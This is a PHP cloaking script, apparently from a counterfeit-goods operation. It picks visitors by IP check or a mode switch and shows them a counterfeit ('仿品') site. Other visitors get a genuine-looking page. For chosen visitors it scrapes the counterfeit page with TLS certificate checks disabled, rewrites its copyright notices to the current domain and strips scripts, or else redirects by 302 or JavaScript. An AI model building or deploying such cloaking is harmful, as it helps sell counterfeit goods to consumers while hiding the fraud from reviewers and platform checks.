<?php
  //require('ip_check.php');
// if($is_fp == 0)
// {
//   exit();
// }



// 获取当前客户访问的网址
$actual_link = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
if(CLOAK_QUERY_ON == 'OFF') {  // 默认匹配查询参数
    $actual_link = strtok($actual_link, "?");
}

if($actual_link === preg_replace("(^https?://)", "", DB_ZP_1 )) {
    $fp_url = DB_FP_1;
    $redirect_method = CLOAK_REDIRECT_METHOD_1;
    $method = SHOW_SITE_MODE_SWITCH_1;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_2)){
    $fp_url = DB_FP_2;
    $redirect_method = CLOAK_REDIRECT_METHOD_2;
    $method = SHOW_SITE_MODE_SWITCH_2;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_3)){
    $fp_url = DB_FP_3;
    $redirect_method = CLOAK_REDIRECT_METHOD_3;
    $method = SHOW_SITE_MODE_SWITCH_3;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_4)){
    $fp_url = DB_FP_4;
    $redirect_method = CLOAK_REDIRECT_METHOD_4;
    $method = SHOW_SITE_MODE_SWITCH_4;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_5)){
    $fp_url = DB_FP_5;
    $redirect_method = CLOAK_REDIRECT_METHOD_5;
    $method = SHOW_SITE_MODE_SWITCH_5;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_6)){
    $fp_url = DB_FP_6;
    $redirect_method = CLOAK_REDIRECT_METHOD_6;
    $method = SHOW_SITE_MODE_SWITCH_6;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_7)){
    $fp_url = DB_FP_7;
    $redirect_method = CLOAK_REDIRECT_METHOD_7;
    $method = SHOW_SITE_MODE_SWITCH_7;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_8)){
    $fp_url = DB_FP_8;
    $redirect_method = CLOAK_REDIRECT_METHOD_8;
    $method = SHOW_SITE_MODE_SWITCH_8;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_9)){
    $fp_url = DB_FP_9;
    $redirect_method = CLOAK_REDIRECT_METHOD_9;
    $method = SHOW_SITE_MODE_SWITCH_9;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_10)){
    $fp_url = DB_FP_10;
    $redirect_method = CLOAK_REDIRECT_METHOD_10;
    $method = SHOW_SITE_MODE_SWITCH_10;
}elseif($actual_link === preg_replace("(^https?://)", "", DB_ZP_11)) {
    $fp_url = DB_FP_11;
    $redirect_method = CLOAK_REDIRECT_METHOD_11;
    $method = SHOW_SITE_MODE_SWITCH_11;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_12)){
    $fp_url = DB_FP_12;
    $redirect_method = CLOAK_REDIRECT_METHOD_12;
    $method = SHOW_SITE_MODE_SWITCH_12;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_13)){
    $fp_url = DB_FP_13;
    $redirect_method = CLOAK_REDIRECT_METHOD_13;
    $method = SHOW_SITE_MODE_SWITCH_13;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_14)){
    $fp_url = DB_FP_14;
    $redirect_method = CLOAK_REDIRECT_METHOD_14;
    $method = SHOW_SITE_MODE_SWITCH_14;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_15)){
    $fp_url = DB_FP_15;
    $redirect_method = CLOAK_REDIRECT_METHOD_15;
    $method = SHOW_SITE_MODE_SWITCH_15;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_16)){
    $fp_url = DB_FP_16;
    $redirect_method = CLOAK_REDIRECT_METHOD_16;
    $method = SHOW_SITE_MODE_SWITCH_16;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_17)){
    $fp_url = DB_FP_17;
    $redirect_method = CLOAK_REDIRECT_METHOD_17;
    $method = SHOW_SITE_MODE_SWITCH_17;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_18)){
    $fp_url = DB_FP_18;
    $redirect_method = CLOAK_REDIRECT_METHOD_18;
    $method = SHOW_SITE_MODE_SWITCH_18;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_19)){
    $fp_url = DB_FP_19;
    $redirect_method = CLOAK_REDIRECT_METHOD_19;
    $method = SHOW_SITE_MODE_SWITCH_19;
}
elseif ($actual_link === preg_replace("(^https?://)", "" , DB_ZP_20)){
    $fp_url = DB_FP_20;
    $redirect_method = CLOAK_REDIRECT_METHOD_20;
    $method = SHOW_SITE_MODE_SWITCH_20;
}elseif($actual_link === preg_replace("(^https?://)", "", DB_ZP_21)) {
    $fp_url = DB_FP_21;
    $redirect_method = CLOAK_REDIRECT_METHOD_21;
    $method = SHOW_SITE_MODE_SWITCH_21;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_22)){
    $fp_url = DB_FP_22;
    $redirect_method = CLOAK_REDIRECT_METHOD_22;
    $method = SHOW_SITE_MODE_SWITCH_22;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_23)){
    $fp_url = DB_FP_23;
    $redirect_method = CLOAK_REDIRECT_METHOD_23;
    $method = SHOW_SITE_MODE_SWITCH_23;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_24)){
    $fp_url = DB_FP_24;
    $redirect_method = CLOAK_REDIRECT_METHOD_24;
    $method = SHOW_SITE_MODE_SWITCH_24;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_25)){
    $fp_url = DB_FP_25;
    $redirect_method = CLOAK_REDIRECT_METHOD_25;
    $method = SHOW_SITE_MODE_SWITCH_25;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_26)){
    $fp_url = DB_FP_26;
    $redirect_method = CLOAK_REDIRECT_METHOD_26;
    $method = SHOW_SITE_MODE_SWITCH_26;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_27)){
    $fp_url = DB_FP_27;
    $redirect_method = CLOAK_REDIRECT_METHOD_27;
    $method = SHOW_SITE_MODE_SWITCH_27;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_28)){
    $fp_url = DB_FP_28;
    $redirect_method = CLOAK_REDIRECT_METHOD_28;
    $method = SHOW_SITE_MODE_SWITCH_28;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_29)){
    $fp_url = DB_FP_29;
    $redirect_method = CLOAK_REDIRECT_METHOD_29;
    $method = SHOW_SITE_MODE_SWITCH_29;
}
elseif ($actual_link === preg_replace("(^https?://)", "", DB_ZP_30)){
    $fp_url = DB_FP_30;
    $redirect_method = CLOAK_REDIRECT_METHOD_30;
    $method = SHOW_SITE_MODE_SWITCH_30;
}
else {
    $fp_url = DB_FP;
    $redirect_method = CLOAK_REDIRECT_METHOD;
    $method = SHOW_SITE_MODE_SWITCH;
}


//指定ip显示仿品
$ips_fp_ary = explode(",", SHOW_SITE_IP);
//判断ip
$client_ip = leichao_get_client_ip();

if($method == "zp")
{
	  $is_fp = 0;
}
elseif($method == "ip_check")
{
	  if(in_array($client_ip, $ips_fp_ary) || result_ip_check())
	  {
		  $is_fp = 1;
	  }
	  else {
		  $is_fp = 0;
	  }

}
elseif($method == "fp")
{
	  $is_fp = 1;
}

if($is_fp == 0) {
    if(CLOAK_REDIRECT_METHOD == 'db'){  //切换数据库

}elseif($redirect_method == 'curl') {
    function file_get_content_sstr($url) {
        $ch = curl_init();
        $timeout = 30;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);            //不取得返回头信息
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 3);
        // https请求 不验证证书和hosts
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        $file_contents = curl_exec($ch);
        curl_close($ch);
        return $file_contents;
    }
    $html = file_get_content_sstr($fp_url);
    
    function caiji_lujing_buquan($content, $address_caiji, $website) {
        $domain = '/http.*\.\w*\//';    // 获取采集页面的主域名，用于页面补全使用
        preg_match($domain, $address_caiji, $res);
        foreach($res as $domain_address){
            $domain_caiji = $domain_address;
        }
//        $parse = parse_url($address_caiji);
//        $website = $parse['host'];
        $surl="http://www.xxx.com/";
        $pattern = '/\'/';              // 正则将所有单引号替换为双引号
        $content = preg_replace($pattern, '"', $content);
        $pattern = '/"\/\//';
//正则将所有"//单引号替换为"http:// 解决部分源码不带http路径信息，采集后资源信息不完整但又不属于本域名下的内链，防止被下面替换问题
        $content = preg_replace($pattern, '"http://', $content);
        $content = formaturl($content, $surl);  //路径补全函数执行
        $pattern = '/Copyright.*<.*>/';
        $content = preg_replace($pattern, 'Copyright ' . $website . ' All rights reserved', $content);//版权信息替换插入
        $pattern = '/copyright.*<.*>/';
        $content = preg_replace($pattern, 'Copyright ' . $website . ' All rights reserved', $content);//小写的版权信息匹配替换插入
        $content = str_replace('http://www.xxx.com/', $domain_caiji, $content);//路径补全为xxx.com，用于下面识别替换
        $preg = "/<script[\s\S]*?<\/script>/i";     // 过滤JS
        $content = preg_replace($preg,"", $content, -1);    //第四个参数中的3表示替换3次，默认是-1，替换全部
        return $content;
    }
    
    // 格式化url
    function formaturl($l1, $l2) {
        if (preg_match_all ( "/(<script[^>]+src=\"([^\"]+)\"[^>]*>)|(<link[^>]+href=\"([^\"]+)\"[^>]*>)|(<img[^>]+src=\"([^\"]+)\"[^>]*>)|(<a[^>]+href=\"([^\"]+)\"[^>]*>)|(<img[^>]+src='([^']+)'[^>]*>)|(<a[^>]+href='([^']+)'[^>]*>)/i", $l1, $regs )) {
            foreach ( $regs [0] as $num => $url ) {
                $l1 = str_replace ( $url, lIIIIl ( $url, $l2 ), $l1 );
            }
        }
        return $l1;
    }
    
    function lIIIIl($l1, $l2) {
        if (preg_match ( "/(.*)(href|src)\=(.+?)( |\/\>|\>).*/i", $l1, $regs )) {
            $I2 = $regs [3];
        }
    
        if (!empty ( $I2 ) && strlen ( $I2 ) > 0) {
            $I1 = str_replace ( chr ( 34 ), "", $I2 );
            $I1 = str_replace ( chr ( 39 ), "", $I1 );
        } else {
            return $l1;
        }
        $url_parsed = parse_url ( $l2 );
        $scheme = $url_parsed ["scheme"];
        if ($scheme != "") {
            $scheme = $scheme . "://";
        }
        $host = $url_parsed ["host"];
        $l3 = $scheme . $host;
        if (strlen ( $l3 ) == 0) {
            return $l1;
        }
        $path = dirname ( $url_parsed ["path"] );
        if ($path [0] == "\\") {
            $path = "";
        }
        $pos = strpos ( $I1, "#" );
        if ($pos > 0)
            $I1 = substr ( $I1, 0, $pos );
    
        //判断类型
        if (preg_match ( "/^(http|https|ftp):(\/\/|\\\\)(([\w\/\\\+\-~`@:%])+\.)+([\w\/\\\.\=\?\+\-~`@\':!%#]|(&amp;)|&)+/i", $I1 )) {
            return $l1;
        } //http开头的url类型要跳过
        elseif ($I1 [0] == "/") {
            $I1 = $l3 . $I1;
        } //绝对路径
        elseif (substr ( $I1, 0, 3 ) == "../") { //相对路径
            while ( substr ( $I1, 0, 3 ) == "../" ) {
                $I1 = substr ( $I1, strlen ( $I1 ) - (strlen ( $I1 ) - 3), strlen ( $I1 ) - 3 );
                if (strlen ( $path ) > 0) {
                    $path = dirname ( $path );
                }
            }
            $I1 = $l3 . $path . "/" . $I1;
        } elseif (substr ( $I1, 0, 2 ) == "./") {
            $I1 = $l3 . $path . substr ( $I1, strlen ( $I1 ) - (strlen ( $I1 ) - 1), strlen ( $I1 ) - 1 );
        } elseif (strtolower ( substr ( $I1, 0, 7 ) ) == "mailto:" || strtolower ( substr ( $I1, 0, 11 ) ) == "javascript:") {
            return $l1;
        } else {
            $I1 = $l3 . $path . "/" . $I1;
        }
        return str_replace ( $I2, "\"$I1\"", $l1 );
    }
    
    $_html = caiji_lujing_buquan($html, $fp_url, $_SERVER['HTTP_HOST']);

    echo $_html;
    exit;
} elseif($redirect_method == '302') {
  header('Location: ' . $fp_url);
  exit;
} else {
?>
  <SCRIPT LANGUAGE="JavaScript">
  var time = 1;
  var timelong = 0;

  function diplaytime(){
    document.all.his.innerHTML = time -timelong ;
    timelong ++;
  }
  function redirect(){
    //history.back();
    window.location.href="<?php echo $fp_url; ?>";
  }

  timer=setInterval('diplaytime()', 30);
  timer=setTimeout('redirect()',time * 30);
  </SCRIPT>
<?php
}
}